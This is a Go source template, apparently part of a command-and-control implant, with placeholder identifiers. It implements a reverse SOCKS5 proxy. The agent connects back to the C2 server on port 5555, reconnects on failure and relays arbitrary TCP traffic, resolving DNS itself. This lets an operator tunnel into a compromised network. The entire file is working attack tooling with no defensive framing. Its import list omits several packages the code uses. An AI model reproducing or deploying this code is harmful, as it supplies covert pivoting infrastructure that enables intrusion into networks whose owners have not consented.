import (
	"fmt"
	"io"
	"net"
	"strings"
	"time"
)

// Reverse proxy functionality
func (a *{AGENT_STRUCT_NAME}) {AGENT_START_REVERSE_PROXY_FUNC}() {
	a.{AGENT_REVERSE_PROXY_LOCK_FIELD}.Lock()
	if a.{AGENT_REVERSE_PROXY_ACTIVE_FIELD} {
		fmt.Printf("[!] Reverse proxy already active.\n")
		a.{AGENT_REVERSE_PROXY_LOCK_FIELD}.Unlock()
		return
	}
	a.{AGENT_REVERSE_PROXY_ACTIVE_FIELD} = true
	a.{AGENT_REVERSE_PROXY_STOP_CHAN_FIELD} = make(chan struct{})
	a.{AGENT_REVERSE_PROXY_LOCK_FIELD}.Unlock()

	// Parse the C2 URL to get the host
	parsed, err := url.Parse(a.{AGENT_CURRENT_C2_URL_FIELD})
	if err != nil {
		fmt.Printf("[-] Reverse proxy: cannot parse C2 URL: %v\n", err)
		return
	}
	host := parsed.Host
	if strings.Contains(host, ":") {
		host = strings.Split(host, ":")[0]
	}
	remoteAddr := net.JoinHostPort(host, "5555")

	for {
		select {
		case <-a.{AGENT_REVERSE_PROXY_STOP_CHAN_FIELD}:
			fmt.Printf("[*] Reverse proxy: stop signal received.\n")
			a.{AGENT_REVERSE_PROXY_LOCK_FIELD}.Lock()
			a.{AGENT_REVERSE_PROXY_ACTIVE_FIELD} = false
			a.{AGENT_REVERSE_PROXY_LOCK_FIELD}.Unlock()
			fmt.Printf("[+] Reverse proxy: stopped.\n")
			return
		default:
			fmt.Printf("[*] Reverse proxy: connecting to %s ...\n", remoteAddr)
			conn, err := net.Dial("tcp", remoteAddr)
			if err != nil {
				fmt.Printf("[-] Reverse proxy: failed to connect: %v\n", err)
				time.Sleep(5 * time.Second)
				continue
			}
			fmt.Printf("[+] Reverse proxy: connected to %s\n", remoteAddr)
			// This handles multiple SOCKS requests for the life of this connection.
			a.{AGENT_HANDLE_SOCKS5_FUNC}(conn)
			fmt.Printf("[*] Reverse proxy: session closed, reconnecting...\n")
			conn.Close()
			time.Sleep(2 * time.Second)
		}
	}
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_STOP_REVERSE_PROXY_FUNC}() {
	a.{AGENT_REVERSE_PROXY_LOCK_FIELD}.Lock()
	defer a.{AGENT_REVERSE_PROXY_LOCK_FIELD}.Unlock()
	if a.{AGENT_REVERSE_PROXY_ACTIVE_FIELD} && a.{AGENT_REVERSE_PROXY_STOP_CHAN_FIELD} != nil {
		close(a.{AGENT_REVERSE_PROXY_STOP_CHAN_FIELD})
	} else {
		fmt.Printf("[-] Reverse proxy: not active.\n")
	}
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_HANDLE_SOCKS5_FUNC}(serverConn net.Conn) {
	defer func() {
		_ = serverConn.Close()
		fmt.Printf("[*] SOCKS5: connection handler exiting\n")
	}()

	// helper to close write side when using net.TCPConn
	closeWrite := func(c net.Conn) {
		if tcp, ok := c.(*net.TCPConn); ok {
			_ = tcp.CloseWrite()
		} else {
			_ = c.Close()
		}
	}

	// idle timeout between SOCKS handshakes -- increase if you want longer-lived idle connections
	idleTimeout := 120 * time.Second

	for {
		// ---- Greeting ----
		_ = serverConn.SetReadDeadline(time.Now().Add(idleTimeout))
		header := make([]byte, 2)
		if _, err := io.ReadFull(serverConn, header); err != nil {
			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
				fmt.Printf("[-] SOCKS5: greeting read timeout/closed: %v\n", err)
			} else {
				fmt.Printf("[-] SOCKS5: greeting read failed: %v\n", err)
			}
			return
		}
		_ = serverConn.SetReadDeadline(time.Time{}) // clear deadline

		if header[0] != 0x05 {
			fmt.Printf("[-] SOCKS5: unsupported version %d\n", header[0])
			return
		}
		nMethods := int(header[1])
		if nMethods <= 0 || nMethods > 255 {
			fmt.Printf("[-] SOCKS5: invalid nMethods %d\n", nMethods)
			return
		}
		methods := make([]byte, nMethods)
		if _, err := io.ReadFull(serverConn, methods); err != nil {
			fmt.Printf("[-] SOCKS5: reading methods failed: %v\n", err)
			return
		}

		// reply: version 5, no authentication
		if _, err := serverConn.Write([]byte{0x05, 0x00}); err != nil {
			fmt.Printf("[-] SOCKS5: failed to write greeting reply: %v\n", err)
			return
		}

		// ---- Request ----
		headerReq := make([]byte, 4)
		if _, err := io.ReadFull(serverConn, headerReq); err != nil {
			fmt.Printf("[-] SOCKS5: request header read failed: %v\n", err)
			return
		}
		if headerReq[0] != 0x05 {
			fmt.Printf("[-] SOCKS5: request version mismatch %d\n", headerReq[0])
			return
		}
		cmd := headerReq[1]
		addrType := headerReq[3]
		if cmd != 0x01 {
			fmt.Printf("[-] SOCKS5: unsupported command %d\n", cmd)
			serverConn.Write([]byte{0x05, 0x07, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
			return
		}

		var dstHost string
		var dstPort uint16

		switch addrType {
		case 0x01: // IPv4
			addrBuf := make([]byte, 4)
			if _, err := io.ReadFull(serverConn, addrBuf); err != nil {
				fmt.Printf("[-] SOCKS5: failed to read IPv4 addr: %v\n", err)
				return
			}
			portBuf := make([]byte, 2)
			if _, err := io.ReadFull(serverConn, portBuf); err != nil {
				fmt.Printf("[-] SOCKS5: failed to read port: %v\n", err)
				return
			}
			ip := net.IPv4(addrBuf[0], addrBuf[1], addrBuf[2], addrBuf[3]).String()
			port := binary.BigEndian.Uint16(portBuf)
			dstHost = ip
			dstPort = port

		case 0x03: // Domain
			lenBuf := make([]byte, 1)
			if _, err := io.ReadFull(serverConn, lenBuf); err != nil {
				fmt.Printf("[-] SOCKS5: failed to read domain length: %v\n", err)
				return
			}
			dlen := int(lenBuf[0])
			if dlen <= 0 || dlen > 255 {
				fmt.Printf("[-] SOCKS5: invalid domain length %d\n", dlen)
				return
			}
			domBuf := make([]byte, dlen+2)
			if _, err := io.ReadFull(serverConn, domBuf); err != nil {
				fmt.Printf("[-] SOCKS5: failed to read domain+port: %v\n", err)
				return
			}
			domain := string(domBuf[:dlen])
			port := binary.BigEndian.Uint16(domBuf[dlen : dlen+2])

			// Agent-side DNS resolution: prefer IPv4 then IPv6
			var chosenIP net.IP
			ctx := context.Background()

			if ips4, err4 := net.DefaultResolver.LookupIP(ctx, "ip4", domain); err4 == nil && len(ips4) > 0 {
				for _, ip := range ips4 {
					if ip == nil || ip.IsUnspecified() || ip.IsMulticast() {
						continue
					}
					chosenIP = ip
					break
				}
			}

			if chosenIP == nil {
				if ips6, err6 := net.DefaultResolver.LookupIP(ctx, "ip6", domain); err6 == nil && len(ips6) > 0 {
					for _, ip := range ips6 {
						if ip == nil || ip.IsUnspecified() || ip.IsMulticast() {
							continue
						}
						chosenIP = ip
						break
					}
				}
			}

			if chosenIP == nil {
				fmt.Printf("[-] SOCKS5: DNS lookup returned no usable IP for %s\n", domain)
				serverConn.Write([]byte{0x05, 0x04, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
				return
			}

			dstHost = chosenIP.String()
			dstPort = port
			fmt.Printf("[*] SOCKS5: resolved %s -> %s\n", domain, dstHost)

		default:
			fmt.Printf("[-] SOCKS5: unsupported addrType %d\n", addrType)
			serverConn.Write([]byte{0x05, 0x08, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
			return
		}

		// prepare address (use bracketed IPv6 when necessary)
		var dstAddr string
		if ip := net.ParseIP(dstHost); ip != nil && ip.To4() == nil {
			dstAddr = fmt.Sprintf("[%s]:%d", dstHost, dstPort)
		} else {
			dstAddr = fmt.Sprintf("%s:%d", dstHost, dstPort)
		}

		// Connect to target
		fmt.Printf("[*] SOCKS5 connect request → %s\n", dstAddr)
		targetConn, err := net.DialTimeout("tcp", dstAddr, 15*time.Second)
		if err != nil {
			fmt.Printf("[-] SOCKS5: connect to %s failed: %v\n", dstAddr, err)
			serverConn.Write([]byte{0x05, 0x05, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
			// keep serverConn open to accept future requests
			continue
		}

		// success reply
		if _, err := serverConn.Write([]byte{0x05, 0x00, 0x00, 0x01, 0, 0, 0, 0, 0, 0}); err != nil {
			fmt.Printf("[-] SOCKS5: failed to write success reply: %v\n", err)
			targetConn.Close()
			return
		}
		fmt.Printf("[+] SOCKS5: connected → %s\n", dstAddr)

		// ---- Relay traffic robustly with proper half-close ----
		done := make(chan struct{}, 2)

		go func() {
			_, _ = io.Copy(targetConn, serverConn) // client -> target
			closeWrite(targetConn)
			done <- struct{}{}
		}()

		go func() {
			_, _ = io.Copy(serverConn, targetConn) // target -> client
			// do not forcibly close serverConn here; outer defer will close after loop exit if needed
			done <- struct{}{}
		}()

		// wait both directions to finish
		<-done
		<-done

		fmt.Printf("[*] SOCKS5: session closed for %s\n", dstAddr)
		// loop back and accept next SOCKS handshake on same serverConn
	}
}